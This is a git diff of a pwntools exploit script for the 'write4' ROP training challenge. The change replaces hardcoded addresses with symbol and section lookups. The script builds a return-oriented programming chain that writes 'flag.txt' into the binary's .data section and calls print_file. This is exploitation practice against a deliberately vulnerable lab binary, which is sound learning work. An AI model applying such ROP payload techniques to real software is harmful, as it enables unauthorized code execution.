@@ -20,7 +20,7 @@ def find_offset(payload):
 exe = './write4'
 elf = context.binary = ELF(exe, checksec=False)
 rop = ROP(elf)
-context.log_level = 'error'
+context.log_level = 'debug'
 
 # crafting the payload
 offset = find_offset(cyclic(100))
@@ -28,19 +28,23 @@ info(f"Offset: {offset:x}")
 
 pop_data = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
 info(f"Pop Data Gadget: {pop_data}")
-#mov_data = rop.find_gadget(["mov    QWORD PTR [r14],r15", "ret", "nop"])[0]
-#info(f"Move Data Gadget: {mov_data}")
+
+mov_data = elf.symbols.usefulGadgets
+info(f"Move Data Gadget: {mov_data}")
 
 pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
 info(f"Pop RDI: {pop_rdi}")
 
+data_section = elf.get_section_by_name('.data').header.sh_addr
+info(f'Data Section Address: {data_section:x}')
+
 payload = flat({ offset: [
         pop_data,
-        0x00601028,
+        data_section,
         b"flag.txt",
-        0x0000000000400628,
+        mov_data,
         pop_rdi,
-        0x00601028,
+        data_section,
         elf.symbols.print_file
     ] })
 write('payload', payload)
